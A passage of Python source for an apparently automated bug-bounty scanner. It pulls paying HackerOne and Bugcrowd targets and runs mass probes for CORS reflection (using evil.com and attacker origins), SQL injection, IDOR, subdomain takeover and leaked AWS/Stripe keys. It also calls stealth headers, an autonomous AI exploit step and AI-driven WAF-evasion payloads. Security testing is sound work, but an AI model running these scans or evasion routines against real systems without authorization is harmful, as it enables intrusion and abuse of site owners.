                return {"type": "HOST_HEADER_INJECTION", "url": url, "severity": "LOW", "confidence": "HIGH",
                        "detail": f"Host header reflected in Location: {loc}"}
    except Exception: pass
    return None

def check_graphql(url):
    try:
        endpoints = ["/graphql", "/api/graphql", "/v1/graphql", "/graphiql"]
        base = f"{urlparse(url).scheme}://{urlparse(url).netloc}"
        
        query = {"query": "query IntrospectionQuery { __schema { queryType { name } mutationType { name } types { ...FullType } } } fragment FullType on __Type { kind name fields(includeDeprecated: true) { name args { name type { name } } type { name } } }"}
        
        for ep in endpoints:
            target = f"{base}{ep}"
            r = requests.post(target, headers=get_stealth_headers(), json=query, timeout=7, verify=False)
            if r.status_code == 200 and "__schema" in r.text and "types" in r.text:
                
                # Check for dangerous mutations
                mutations = []
                dangerous_kws = ["admin", "delete", "update", "password", "user", "token", "role"]
                
                try:
                    schema = r.json()
                    types = schema.get("data", {}).get("__schema", {}).get("types", [])
                    for t in types:
                        if t.get("name") == "Mutation" and t.get("fields"):
                            for f in t["fields"]:
                                fname = f.get("name", "").lower()
                                if any(kw in fname for kw in dangerous_kws):
                                    mutations.append(f.get("name"))
                except:
                    pass
                
                detail = "GraphQL Introspection is enabled (schema leak)"
                severity = "MEDIUM"
                if mutations:
                    detail += f". Dangerous mutations exposed: {', '.join(mutations[:5])}"
                    severity = "HIGH"
                    
                return {"type": "GRAPHQL_INTROSPECTION", "url": target, "severity": severity, "confidence": "HIGH",
                        "requires_manual_verification": True, "duplicate_risk": "MEDIUM", "detail": detail}
    except Exception: pass
    return None

def check_security_headers(url):
    try:
        r = requests.get(url, headers=get_stealth_headers(), timeout=5, verify=False)
        missing = []
        if "Strict-Transport-Security" not in r.headers: missing.append("HSTS")
        if "X-Frame-Options" not in r.headers and "frame-ancestors" not in r.headers.get("Content-Security-Policy", ""): missing.append("Clickjacking (XFO/CSP)")
        
        if missing:
            return {"type": "MISSING_SECURITY_HEADERS", "url": url, "severity": "LOW", "confidence": "HIGH",
                    "detail": f"Missing: {', '.join(missing)}"}
    except Exception: pass
    return None

def check_cors(base_url):
    CORS_PATHS = ['', '/api/user', '/api/profile', '/api/me', '/account', '/user/settings', '/api/v1/user', '/dashboard']
    try:
        def test_origin(url, origin_val):
            h = {**get_stealth_headers(), "Origin": origin_val}
            r = requests.get(url, headers=h, timeout=3, verify=False, allow_redirects=False)
            return r

        for path in CORS_PATHS:
            url = f"{base_url.rstrip('/')}{path}"
            r1 = test_origin(url, "https://evil.com")
            acao1 = r1.headers.get("Access-Control-Allow-Origin", "")
            
            # Test null origin
            r_null = test_origin(url, "null")
            acao_null = r_null.headers.get("Access-Control-Allow-Origin", "")
            
            if acao1 != "https://evil.com" and acao_null != "null":
                continue
                
            r2 = test_origin(url, f"https://attacker-{random.randint(1000,9999)}.com")
            acao2 = r2.headers.get("Access-Control-Allow-Origin", "")
            
            is_vuln = False
            origin_type = ""
            if acao1 == "https://evil.com" and acao2.startswith("https://attacker-"):
                is_vuln = True
                origin_type = "arbitrary origins"
                r_vuln = r2
            elif acao_null == "null":
                is_vuln = True
                origin_type = "null origin"
                r_vuln = r_null
                
            if not is_vuln:
                continue

            acac = r_vuln.headers.get("Access-Control-Allow-Credentials", "").lower() == "true"
            expose = r_vuln.headers.get("Access-Control-Expose-Headers", "").lower()
            
            sensitive_headers = ["authorization", "x-auth-token", "set-cookie", "x-user-id"]
            exposed_sensitive = [h for h in sensitive_headers if h in expose]

            # Ensure response has body and is not a 404/error page
            if len(r_vuln.text) < 10 or r_vuln.status_code >= 400:
                continue

            # Deep paths are more likely to return PII, so they carry higher severity if credentials are allowed
            is_deep_path = path != ''
            
            if exposed_sensitive and acac:
                return {"type": "CORS_REFLECTION", "url": url, "severity": "CRITICAL", "confidence": "HIGH",
                        "duplicate_risk": "HIGH", "detail": f"Reflects {origin_type} + Credentials + Exposes {', '.join(exposed_sensitive)} on deep path {path}" if is_deep_path else f"Reflects {origin_type} + Credentials + Exposes {', '.join(exposed_sensitive)}"}
            elif acac:
                severity = "CRITICAL" if is_deep_path else "HIGH"
                return {"type": "CORS_REFLECTION", "url": url, "severity": severity, "confidence": "HIGH",
                        "duplicate_risk": "VERY HIGH", "detail": f"Reflects {origin_type} + allows Credentials on path {path}"}
            elif not is_deep_path:
                return {"type": "CORS_REFLECTION", "url": url, "severity": "LOW", "confidence": "MEDIUM",
                        "duplicate_risk": "VERY HIGH", "detail": f"Reflects {origin_type} but NO credentials"}
    except Exception: pass
    return None

def check_takeover(url):
    try:
        host = urlparse(url).hostname
        # Step 1: DNS check
        r = requests.get(f"https://1.1.1.1/dns-query?name={host}&type=A", headers={"Accept": "application/dns-json"}, timeout=3)
        dns_status = r.json().get("Status", 0)
        # Step 2: Check CNAME
        rc = requests.get(f"https://1.1.1.1/dns-query?name={host}&type=CNAME", headers={"Accept": "application/dns-json"}, timeout=3)
        cname_data = rc.json()
        cname_target = ""
        for ans in cname_data.get("Answer", []):
            if ans.get("type") == 5:
                cname_target = ans.get("data", "")
                break
        if dns_status != 0:  # NXDOMAIN
            if cname_target:  # Dangling CNAME = real takeover candidate
                # Verify CNAME target is actually resolvable to a takeover service
                # We will only flag HIGH if the CNAME contains known provider strings (aws, heroku, github, etc)
                CLAIMABLE_SERVICES = ['github.io', 's3.amazonaws.com', 'herokuapp.com', 'netlify.app', 'pages.dev', 'azurewebsites.net', 'wpengine', 'surge.sh']
                NOT_CLAIMABLE = ['elb.amazonaws.com', 'cloudfront.net', 'awsdns']
                
                cname_lower = cname_target.lower()
                
                if any(nc in cname_lower for nc in NOT_CLAIMABLE):
                    return None # Unclaimable AWS managed service
                    
                if any(p in cname_lower for p in CLAIMABLE_SERVICES):
                    return {"type": "SUBDOMAIN_TAKEOVER", "url": url, "severity": "HIGH", "confidence": "HIGH",
                            "duplicate_risk": "HIGH", "detail": f"NXDOMAIN + dangling CNAME → {cname_target} (Claimable service)"}
                else:
                    return {"type": "SUBDOMAIN_TAKEOVER", "url": url, "severity": "LOW", "confidence": "LOW",
                            "requires_manual_verification": True, "detail": f"NXDOMAIN + generic dangling CNAME → {cname_target} (Unknown if claimable)"}
            return None  # NXDOMAIN without CNAME = just unconfigured, not exploitable
        # Step 3: Even if DNS resolves, check HTTP for takeover fingerprints
        try:
            rh = requests.get(url, headers=get_stealth_headers(), timeout=5, verify=False)
            for fingerprint, provider in TAKEOVER_FINGERPRINTS:
                if fingerprint in rh.text:
                    return {"type": "SUBDOMAIN_TAKEOVER", "url": url, "severity": "HIGH", "confidence": "HIGH",
                            "detail": f"Takeover fingerprint for {provider} detected"}
        except: pass
    except Exception: pass

def check_sensitive_single(url, b_status=None, b_len=None):
    try:
        r = requests.get(url, headers=get_stealth_headers(), timeout=3, verify=False)
        if r.status_code == 200 and len(r.text) > 50:
            if b_status == 200 and b_len is not None and abs(len(r.text) - b_len) < 100:
                return None
            return {"type": "SENSITIVE_PATH", "url": url, "severity": "MEDIUM"}
    except Exception: pass

def check_sqli_single(target, payload):
    try:
        # Step 1: Baseline timing (clean request to base URL)
        base_url = target.split("?")[0]
        try:
            bs = time.time()
            requests.get(base_url, headers=get_stealth_headers(), timeout=8, verify=False)
            baseline = time.time() - bs
        except:
            baseline = 0.5
        
        # Step 2: Test with payload
        start = time.time()
        r = requests.get(target, headers=get_stealth_headers(), timeout=12, verify=False)
        el = time.time() - start
        
        if r.status_code == 500:
            # Only flag if response contains actual SQL error strings
            sql_indicators = ["sql", "syntax", "mysql", "ora-", "postgres", "sqlite", "odbc", "microsoft"]
            if any(ind in r.text.lower() for ind in sql_indicators):
                return {"type": "SQLI_ERROR", "url": target, "severity": "HIGH", "confidence": "HIGH",
                        "detail": "SQL error string in 500 response"}
            return None  # Generic 500 is NOT sql injection
        
        elif "WAITFOR" in payload:
            delay = el - baseline
            # Require delay to be at least 3.5s MORE than baseline
            if delay >= 3.5 and el >= 4.5:
                # VERIFY: Send payload a second time
                time.sleep(0.3)
                s2 = time.time()
                requests.get(target, headers=get_stealth_headers(), timeout=12, verify=False)
                el2 = time.time() - s2
                if el2 >= 4.0 and (el2 - baseline) >= 3.0:
                    return {"type": "SQLI_TIME", "url": target, "severity": "CRITICAL", "confidence": "HIGH",
                            "detail": f"Baseline:{baseline:.1f}s Delay1:{el:.1f}s Delay2:{el2:.1f}s (verified)"}
            return None  # Slow server, not SQLi
    except Exception: pass

def check_idor_single(target, b_len):
    try:
        r1 = requests.get(target, headers=get_stealth_headers(), timeout=3, verify=False)
        if r1.status_code != 200:
            return None
        time.sleep(0.2)
        
        # We need to ensure that the content is dynamically changing based on the ID, 
        # not just returning a static dashboard or login page.
        # Test with a random ID to see if the response is different.
        random_target = re.sub(r'=[^&]+', f'={random.randint(90000, 99999)}', target)
        if random_target == target: return None
        
        rr = requests.get(random_target, headers=get_stealth_headers(), timeout=3, verify=False)
        
        len1, len_r = len(r1.text), len(rr.text)
        
        # If the valid ID and the random ID return pages of very similar length, it's just a static template
        if abs(len1 - len_r) < 100:
            return None
            
        diff = abs(len1 - b_len)
        if diff > 500:  # Require significant difference from base endpoint
            data_indicators = ['"email"', '"username"', '"user_id"', '"name"', '"address"',
                             '"phone"', '"balance"', '"account"', '"token"', '"password"']
            has_data = any(ind in r1.text.lower() for ind in data_indicators)
            
            # Additional check: Content-Type should ideally be JSON for API IDORs
            is_json = "application/json" in r1.headers.get("Content-Type", "")
            
            if has_data and is_json:
                return {"type": "IDOR_CANDIDATE", "url": target, "severity": "HIGH", "confidence": "HIGH",
                        "detail": f"JSON response differs from invalid ID ({abs(len1 - len_r)} bytes diff)"}
            elif has_data:
                return {"type": "IDOR_CANDIDATE", "url": target, "severity": "MEDIUM", "confidence": "MEDIUM",
                        "detail": f"HTML response differs from invalid ID, contains data keywords"}
    except Exception: pass

def get_bin(name):
    ext = ".exe" if platform.system().lower() == "windows" else ""
    bin_path = Path("tools") / name / f"{name}{ext}"
    return str(bin_path) if bin_path.exists() else None

def check_nuclei(url):
    nuclei_bin = get_bin("nuclei")
    if not nuclei_bin: return None
    try:
        cmd = [nuclei_bin, "-u", url, "-t", "cves/", "-severity", "critical,high", "-jsonl", "-silent"]
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        findings = []
        for line in result.stdout.splitlines():
            if not line.strip(): continue
            try:
                data = json.loads(line)
                findings.append({
                    "type": f"NUCLEI_{data.get('info', {}).get('name', 'VULN')}".replace(" ", "_").upper(),
                    "url": data.get("matched-at", url),
                    "severity": data.get("info", {}).get("severity", "HIGH").upper()
                })
            except: pass
        return findings if findings else None
    except Exception: return None

def check_ffuf(url):
    ffuf_bin = get_bin("ffuf")
    wordlist = Path("wordlists/common.txt")
    if not ffuf_bin or not wordlist.exists(): return None
    try:
        # FFUF json output prints the result for each match when -silent is not used, 
        # but with -json it prints the entire array at the end.
        cmd = [ffuf_bin, "-u", f"{url}/FUZZ", "-w", str(wordlist), "-mc", "200,204,301,302,307,401,403", "-t", "10", "-json", "-silent"]
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        findings = []
        try:
            data = json.loads(result.stdout)
            for res in data.get("results", []):
                findings.append({
                    "type": "FFUF_DISCOVERY",
                    "url": res.get("url"),
                    "severity": "MEDIUM",
                    "detail": f"Status: {res.get('status')} | Words: {res.get('words')}"
                })
        except: pass
        return findings if findings else None
    except Exception: return None

def check_subfinder(domain):
    bin_path = get_bin("subfinder")
    if not bin_path: return []
    try:
        r = subprocess.run([bin_path, "-d", domain, "-silent"], capture_output=True, text=True, timeout=30)
        return [f"https://{x.strip()}" for x in r.stdout.splitlines() if x.strip()]
    except: return []

def check_wayback_machine(domain):
    try:
        url = f"http://web.archive.org/cdx/search/cdx?url=*.{domain}/*&output=json&fl=original&collapse=urlkey&limit=500"
        r = requests.get(url, timeout=10)
        data = r.json()
        if len(data) > 1:
            return [row[0] for row in data[1:]]
    except: pass
    return []

def check_gau(domain):
    bin_path = get_bin("gau")
    if not bin_path: return []
    try:
        r = subprocess.run([bin_path, domain], capture_output=True, text=True, timeout=30)
        return [x.strip() for x in r.stdout.splitlines() if x.strip() and x.startswith("http")]
    except: return []

SECRET_REGEXES = {
    "AWS_API_KEY": r"(AKIA[0-9A-Z]{16})",
    "STRIPE_KEY": r"(sk_live_[0-9a-zA-Z]{24})",
    "GOOGLE_MAPS_KEY": r"(AIza[0-9A-Za-z-_]{35})"
}

def check_js_secrets(url):
    findings = []
    try:
        r = requests.get(url, headers=get_stealth_headers(), timeout=5, verify=False)
        html = r.text
        
        # Helper to process text for secrets
        def extract_secrets(source_text, source_url):
            for name, pattern in SECRET_REGEXES.items():
                matches = re.findall(pattern, source_text)
                for m in set(matches):
                    if name == "GOOGLE_MAPS_KEY":
                        # VERIFY the Google Maps key
                        test_url = f"https://maps.googleapis.com/maps/api/staticmap?center=45%2C10&zoom=7&size=400x400&key={m}"
                        try:
                            r_test = requests.get(test_url, timeout=5)
                            if r_test.status_code == 200:
                                findings.append({
                                    "type": "VULNERABLE_GOOGLE_MAPS_KEY",
                                    "url": source_url,
                                    "severity": "HIGH",
                                    "confidence": "HIGH",
                                    "detail": f"Key {m} has UNRESTRICTED StaticMap API access (Billing Abuse possible)"
                                })
                        except: pass
                    else:
                        findings.append({
                            "type": f"EXPOSED_SECRET_{name}",
                            "url": source_url,
                            "severity": "CRITICAL",
                            "confidence": "HIGH",
                            "detail": f"Found {name} in source"
                        })
                        
        # 1. Check the main HTML page
        extract_secrets(html, url)
        
        # 2. Check all included external scripts
        scripts = re.findall(r'<script[^>]+src="([^">]+)"', html)
        for s in scripts:
            if not s.startswith("http"):
                s = urlparse(url).scheme + "://" + urlparse(url).hostname + ("/" + s if not s.startswith("/") else s)
            try:
                sr = requests.get(s, headers=get_stealth_headers(), timeout=5, verify=False)
                extract_secrets(sr.text, s)
            except: pass
    except: pass
    return findings if findings else None

def check_tech_stack_routing(url):
    try:
        r = requests.get(url, headers=get_stealth_headers(), timeout=5, verify=False)
        techs = []
        text_lower = r.text.lower()
        if "wp-content" in text_lower or "wordpress" in text_lower: techs.append("WordPress")
        if "react" in text_lower or "data-reactroot" in text_lower: techs.append("React")
        if "x-powered-by" in r.headers: techs.append(r.headers["x-powered-by"])
        return techs
    except: return []

def check_shodan(domain):
    if not SHODAN_API_KEY or "your_" in SHODAN_API_KEY: return []
    findings = []
    try:
        r = requests.get(f"https://api.shodan.io/shodan/host/search?key={SHODAN_API_KEY}&query=hostname:{domain}", timeout=10)
        data = r.json()
        for match in data.get("matches", []):
            ip = match.get("ip_str")
            port = match.get("port")
            if port in [3306, 5432, 27017, 6379, 11211]:
                findings.append({
                    "type": "EXPOSED_DATABASE_PORT",
                    "url": f"http://{ip}:{port}",
                    "severity": "CRITICAL",
                    "detail": f"Exposed Port {port} via Shodan on Origin IP {ip}"
                })
            elif port in [3389, 22, 23, 21]:
                findings.append({
                    "type": "EXPOSED_ADMIN_PORT",
                    "url": f"http://{ip}:{port}",
                    "severity": "HIGH",
                    "detail": f"Exposed Admin Port {port} via Shodan on Origin IP {ip}"
                })
    except: pass
    return findings

# --- Engine ---
def scan_target_fast(handle, target_data, args=None):
    urls = list(target_data.get("urls", []))
    scope_mgr = target_data.get("scope_mgr")
    findings = []  # Initialize BEFORE any use
    log(f"--- Scanning {handle} ({len(urls)} initial URLs) ---")
    if urls:
        base_domain = urlparse(urls[0]).hostname
        if base_domain:
            log(f"[*] Expanding attack surface for {base_domain}...")
            subs = check_subfinder(base_domain)
            if subs: log(f"  [+] Subfinder found {len(subs)} subdomains")
            urls = list(set(urls + subs))
            
            # Dynamic Subdomain Alteration (Altdns / DNSGen logic)
            try:
                log(f"  [*] Generating subdomain permutations for {len(subs)} subdomains...")
                perms = []
                prefixes = ["dev-", "staging-", "test-", "api-v2-", "admin-"]
                for s in subs:
                    h = urlparse(s).hostname
                    if h:
                        for p in prefixes:
                            perms.append(f"https://{p}{h}")
                if perms:
                    urls = list(set(urls + perms))
                    log(f"  [+] Added {len(perms)} permutation guesses to scope")
            except: pass
            
            gu = check_gau(base_domain)
            if gu: log(f"  [+] GAU found {len(gu)} historical URLs")
            urls = list(set(urls + gu))
            
            wayback = check_wayback_machine(base_domain)
            if wayback: log(f"  [+] Wayback Machine found {len(wayback)} historical URLs")
            urls = list(set(urls + wayback))
            
            # STRICT SCOPE FILTERING
            if scope_mgr:
                pre_filter = len(urls)
                urls = [u for u in urls if scope_mgr.is_in_scope(u)]
                log(f"  [+] Scope Enforcement: Dropped {pre_filter - len(urls)} out-of-scope URLs. Kept {len(urls)}.")
            
            urls = urls[:100]
            
            sho = check_shodan(base_domain)
            if sho: 
                log(f"  [+] Shodan found {len(sho)} exposed origin IPs/ports")
                findings.extend(sho)

            # === Feature 3: State-Diff Engine ===
            if FEATURES_LOADED and STATE_DIFF_ENGINE:
                log(f"[*] Running state-diff analysis for {base_domain}...")
                try:
                    base_url = f"https://{base_domain}"
                    sub_domains = [urlparse(u).hostname for u in urls if urlparse(u).hostname]
                    delta = STATE_DIFF_ENGINE.diff_and_update(
                        base_domain, base_url=base_url, subdomains=sub_domains
                    )
                    # Prioritize new/changed assets
                    priority_targets = STATE_DIFF_ENGINE.get_priority_scan_targets(delta, base_url)
                    if priority_targets and not delta.get("is_first_scan"):
                        log(f"  [+] 🔥 {len(priority_targets)} priority targets from state diff")
                        for pt in priority_targets:
                            pt_url = pt["url"]
                            if pt_url not in urls:
                                urls.append(pt_url)
                except Exception as e:
                    log(f"  [-] State diff error: {e}")
            
    log(f"[*] Final scan scope: {len(urls)} URLs")
    
    tasks = []
    with ThreadPoolExecutor(max_workers=50) as executor:
        for u in urls:
            tasks.append(executor.submit(check_cors, u))
            tasks.append(executor.submit(check_takeover, u))
        
        bases = list(set(f"{urlparse(u).scheme}://{urlparse(u).hostname}" for u in urls))[:5]
        for b in bases:
            techs = check_tech_stack_routing(b)
            if techs:
                log(f"  [+] Tech Stack Detected for {b}: {', '.join(techs)}")
                if "React" in techs:
                    log(f"      -> 🚀 Routing {b} explicitly to Headless SPA analyzer")
            
            try:
                rand_path = f"/this-does-not-exist-{random.randint(10000, 99999)}"
                b_resp = requests.get(f"{b}{rand_path}", headers=get_stealth_headers(), timeout=3, verify=False)
                b_status = b_resp.status_code
                b_len = len(b_resp.text)
            except Exception:
                b_status = None
                b_len = None

            # === Original Scan Modules ===
            tasks.append(executor.submit(check_nuclei, b))
            tasks.append(executor.submit(check_ffuf, b))
            tasks.append(executor.submit(check_js_secrets, b))
            tasks.append(executor.submit(check_blind_oob, b))
            tasks.append(executor.submit(check_headless_spa, b))
            tasks.append(executor.submit(ai_autonomous_exploit, b))
            tasks.append(executor.submit(check_crlf, b))
            tasks.append(executor.submit(check_host_header, b))
            tasks.append(executor.submit(check_graphql, b))
            tasks.append(executor.submit(check_security_headers, b))

            # === NEW: Awesome Bug Bounty Tools — Full Scanner Suite ===
            if SCANNERS_LOADED:
                # AI Logic Fuzzer
                tasks.append(executor.submit(run_headless_crawler_analyzer, b))
                
                # Exploitation scanners
                tasks.append(executor.submit(check_subdomain_takeover, b)) # Fast DNS resolution first
                tasks.append(executor.submit(run_naabu_scan, b)) # Discover hidden dev ports
                tasks.append(executor.submit(fetch_wayback_urls, b)) # Time-travel recon
                tasks.append(executor.submit(hunt_js_secrets, b)) # Parse JS for AWS keys
                tasks.append(executor.submit(check_cors_misconfig, b)) # Zero-FP CORS takeover
                tasks.append(executor.submit(check_graphql_introspection, b)) # GraphQL Dumper
                
                tasks.append(executor.submit(run_wcd_scan, b)) # Zero-FP Web Cache Deception
                tasks.append(executor.submit(run_mass_assignment_fuzzer, b)) # Privilege Escalation
                tasks.append(executor.submit(run_cloud_ssrf_fuzzer, b)) # Cloud Metadata SSRF
                tasks.append(executor.submit(run_host_header_fuzzer, b)) # Host Header Injection
                tasks.append(executor.submit(run_open_redirect_fuzzer, b)) # Zero-FP Open Redirect
                tasks.append(executor.submit(run_jwt_fuzzer, b)) # JWT Alg None Bypass
                tasks.append(executor.submit(run_lfi_fuzzer, b)) # Local File Inclusion
                
                tasks.append(executor.submit(run_h2_race_condition, b)) # HTTP/2 Race Conditions
                tasks.append(executor.submit(run_oob_ssrf, b)) # Blind OOB SSRF via Interactsh
                tasks.append(executor.submit(run_prototype_pollution, b)) # Client-Side Prototype Pollution
                tasks.append(executor.submit(run_smuggling_advanced, b)) # HTTP Request Smuggling
                tasks.append(executor.submit(run_oauth_hijack, b)) # OAuth 2.0 / SSO Hijacker
                tasks.append(executor.submit(run_graphql_batching, b)) # GraphQL Batching / DoS
                tasks.append(executor.submit(run_swagger_matrix, b)) # Swagger OpenAPI Matrix
                tasks.append(executor.submit(run_ssti_fuzzer, b)) # Server-Side Template Injection
                tasks.append(executor.submit(run_dom_xss_tracer, b)) # Headless DOM-XSS Tracer
                tasks.append(executor.submit(run_waf_evasion, b)) # Auto-WAF Evasion Proxy
                
                tasks.append(executor.submit(run_arjun_scan, b)) # Parameter Discovery first
                tasks.append(executor.submit(check_hardcoded_payloads, b))
                tasks.append(executor.submit(run_sqlmap_scan, b))
                tasks.append(executor.submit(run_commix_scan, b))
                tasks.append(executor.submit(run_xsstrike_scan, b))
                tasks.append(executor.submit(run_ssrfmap_scan, b))
                tasks.append(executor.submit(run_cve_scans, b))
                tasks.append(executor.submit(check_api_versioning, b))
                tasks.append(executor.submit(check_rate_limit, b))
                tasks.append(executor.submit(check_js_analyzer, b))
                tasks.append(executor.submit(check_api_schema, b))
                tasks.append(executor.submit(run_dorking, b))
                tasks.append(executor.submit(check_graphql, b))
                
                # Execute dynamically generated custom AI tools
                for custom_scanner in CUSTOM_SCANNERS:
                    tasks.append(executor.submit(custom_scanner, b))
                tasks.append(executor.submit(check_xss, b))
                tasks.append(executor.submit(check_dom_xss, b))
                tasks.append(executor.submit(check_ssrf, b))
                tasks.append(executor.submit(check_ssti, b))
                tasks.append(executor.submit(check_csrf, b))
                tasks.append(executor.submit(check_xxe, b))
                tasks.append(executor.submit(check_command_injection, b))
                tasks.append(executor.submit(check_directory_traversal, b))
                tasks.append(executor.submit(check_insecure_deserialization, b))
                tasks.append(executor.submit(check_request_smuggling, b))
                tasks.append(executor.submit(check_cache_poisoning, b))
                tasks.append(executor.submit(check_race_condition, b))
                # Discovery scanners
                tasks.append(executor.submit(check_jwt_vulnerabilities, b))
                tasks.append(executor.submit(check_cms_vulnerabilities, b))
                tasks.append(executor.submit(check_s3_buckets, b))
                tasks.append(executor.submit(check_git_exposure, b))
                tasks.append(executor.submit(check_postmessage, b))
                tasks.append(executor.submit(check_advanced_secrets, b))
                tasks.append(executor.submit(check_idor_advanced, b))
                # Recon scanners
                tasks.append(executor.submit(detect_waf, b))
                tasks.append(executor.submit(check_ports, b))
                tasks.append(executor.submit(check_technologies, b))
                tasks.append(executor.submit(discover_parameters, b))
                tasks.append(executor.submit(discover_links_and_js, b))

            for path in INTERESTING_PATHS:
                tasks.append(executor.submit(check_sensitive_single, f"{b}{path}", b_status, b_len))
                
            for ep in ASP_ENDPOINTS:
                for param in SQLI_PARAMS:
                    for payload in SQLI_PAYLOADS:
                        target = f"{b}{ep}?{param}={requests.utils.quote(payload)}"
                        tasks.append(executor.submit(check_sqli_single, target, payload))
                        
            for ep in IDOR_ENDPOINTS:
                try:
                    b_req = requests.get(f"{b}{ep}", headers=get_stealth_headers(), timeout=3, verify=False)
                    ep_len = len(b_req.text)
                    ep_status = b_req.status_code
                    if ep_status == 200 and b_status == 200 and abs(ep_len - b_len) < 100:
                        continue
                    for param in IDOR_PARAMS:
                        for tid in TEST_IDS:
                            target = f"{b}{ep}?{param}={tid}"
                            tasks.append(executor.submit(check_idor_single, target, ep_len))
                except Exception: pass
            
            for u in urls:
                tasks.append(executor.submit(check_open_redirect, u))
                tasks.append(executor.submit(check_lfi, u))

            # === Feature 2: Dual-Session IDOR Detection ===
            # === Feature 3: Dual-Session IDOR Scanning ===
            if FEATURES_LOADED:
                # Check if we have credentials for this specific program/domain
                domain_creds = IDOR_CREDENTIALS.get(handle) or IDOR_CREDENTIALS.get("default")
                
                # NEW: If credentials are not present but user wants auto-auth
                if not domain_creds and args and hasattr(args, 'google_sso_emails') and args.google_sso_emails:
                    try:
                        from modules.google_sso_automator import get_sso_credentials
                        emails = args.google_sso_emails.split(",")
                        passes = args.google_sso_passes.split(",")
                        if len(emails) == 2 and len(passes) == 2:
                            log(f"[*] Dynamically grabbing Google SSO session for {handle}...")
                            # Search for a legitimate login URL instead of blindly picking the first one
                            login_url = None
                            for u in target_data.get("urls", []):
                                u_lower = u.lower()
                                if any(x in u_lower for x in ["login", "signin", "auth", "account", "sso"]):
                                    login_url = u
                                    break
                            
                            if not login_url:
                                login_url = f"https://{handle}.com/login"
                                
                            domain_creds = get_sso_credentials(login_url, emails[0], passes[0], emails[1], passes[1])
                            # Cache it in memory so we don't auth twice
                            IDOR_CREDENTIALS[handle] = domain_creds
                    except Exception as e:
                        log(f"[-] Auto Google SSO failed for {handle}: {e}")

                if domain_creds:
                    tasks.append(executor.submit(check_idor_dual_session, b, handle, domain_creds))

            # === Feature 5: Context-Aware Payload Generation ===
            if FEATURES_LOADED and GEMINI_API_KEY and "your_" not in GEMINI_API_KEY:
                tasks.append(executor.submit(_run_context_payloads, b, handle))

        for future in as_completed(tasks):
            res = future.result()
            if res:
                if isinstance(res, list):
                    for r in res:
                        r["program"] = handle
                        findings.append(r)
                else:
                    res["program"] = handle
                    findings.append(res)
                    
    # === Feature 4: WAF Evasion Re-test ===
    # For any finding that was blocked by WAF, try AI evasion
    if FEATURES_LOADED and GEMINI_API_KEY and "your_" not in GEMINI_API_KEY:
        waf_engine = WAFEvasionEngine(GEMINI_API_KEY, max_rounds=2, payloads_per_round=3)
        waf_retested = []
        for f in findings:
            if f.get("waf_blocked"):
                log(f"  [WAF Evasion] Retesting {f.get('type')} with AI bypass...")
                result = waf_engine.evade_and_test(
                    url=f.get("url", ""),
                    original_payload=f.get("payload", ""),
                    vuln_type=f.get("type", "XSS"),
                )
                if result.get("success"):
                    f["waf_bypassed"] = True
                    f["bypass_payload"] = result.get("bypass_payload")
                    f["confidence"] = "HIGH"
                    f["detail"] = f"{f.get('detail', '')} [WAF bypassed with AI evasion]"
                    waf_retested.append(f)
        if waf_retested:
            log(f"  [WAF Evasion] {len(waf_retested)} findings recovered after WAF bypass")

    log(f"Found {len(findings)} issues for {handle}")
    return findings


def _run_context_payloads(base_url, handle):
    """Feature 5 helper: generate and test context-aware payloads for a base URL."""
    try:
        gen = ContextPayloadGenerator(GEMINI_API_KEY)
        payloads = gen.generate_for_target(base_url, max_payloads=10)
        if payloads:
            hits = gen.test_payloads(payloads)
            for h in hits:
                h["program"] = handle
            return hits if hits else None
    except Exception as e:
        pass
    return None

def fetch_all_targets():
    """Fetch targets dynamically from HackerOne and Bugcrowd via public repos"""
    log("[*] Fetching dynamic targets from H1 and Bugcrowd...")
    all_targets = {}
    
    # 1. HackerOne
    try:
        h1_url = "https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/master/data/hackerone_data.json"
        r = requests.get(h1_url, timeout=30)
        h1_data = r.json()
        for p in h1_data:
            if not p.get("offers_bounties", False): continue
            handle = p.get("handle")
            urls = []
            for t in p.get("targets", {}).get("in_scope", []):
                asset = t.get("asset_identifier", "")
                atype = t.get("asset_type", "").upper()
                if atype in ("URL", "WILDCARD") and "*" not in asset:
                    clean = asset.strip().rstrip("/")
                    if not clean.startswith("http"): clean = f"https://{clean}"
                    urls.append(clean)
            if urls:
                all_targets[handle] = {"urls": urls[:50], "scope_mgr": None}
    except Exception as e: log(f"[-] Failed to fetch H1 targets: {e}")
        
    # 2. Bugcrowd
    try:
        bc_url = "https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/master/data/bugcrowd_data.json"
        r = requests.get(bc_url, timeout=30)
        bc_data = r.json()
        for p in bc_data:
            if not p.get("has_bounty", False): continue
            handle = p.get("code")
            urls = []
            for t in p.get("targets", {}).get("in_scope", []):
                asset = t.get("target", "")
                if asset and " " not in asset and "." in asset and "*" not in asset:
                    clean = asset.strip().rstrip("/")
                    if not clean.startswith("http"): clean = f"https://{clean}"
                    urls.append(clean)
            if urls:
                all_targets[f"bugcrowd_{handle}"] = {"urls": urls[:50], "scope_mgr": None}
    except Exception as e: log(f"[-] Failed to fetch Bugcrowd targets: {e}")
    
    log(f"[+] Loaded {len(all_targets)} bug bounty programs paying bounties")
    return all_targets

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("target", nargs="?", help="Specific target")
    parser.add_argument("--dynamic", action="store_true", help="Dynamically fetch fresh targets")
    parser.add_argument("--google-sso-emails", type=str, help="Comma separated list of two Google emails for IDOR testing")
    parser.add_argument("--google-sso-passes", type=str, help="Comma separated list of two Google passwords for IDOR testing")
    args, unknown = parser.parse_known_args()

    if args.target:
        if args.dynamic:
            all_t = fetch_all_targets()
            if args.target in all_t:
                targets = {args.target: all_t[args.target]}
                log(f"[*] Forced manual dynamic scan on target: {args.target}")
            else:
                log(f"[-] Target {args.target} not found in dynamic HackerOne/Bugcrowd dataset.")
                return
        else:
            all_t = load_targets()
            if args.target in all_t:
                targets = {args.target: all_t[args.target]}
                log(f"[*] Forced manual local scan on target: {args.target}")
            else:
                log(f"[-] Target {args.target} not found in local data/selected_targets/")
                return
    elif args.dynamic:
        targets = fetch_all_targets()
        import random
        
        # New Program Tracking
        known_programs_file = DATA_DIR / "known_programs.json"
        known_programs = set()
        if known_programs_file.exists():
            try: known_programs = set(json.loads(known_programs_file.read_text()))
            except: pass
            
        current_programs = set(targets.keys())
        
        if not known_programs:
            log("[*] No baseline found. Initializing known programs baseline silently (no alerts).")
            known_programs_file.write_text(json.dumps(list(current_programs)))
            new_programs = set()
        else:
            new_programs = current_programs - known_programs
        
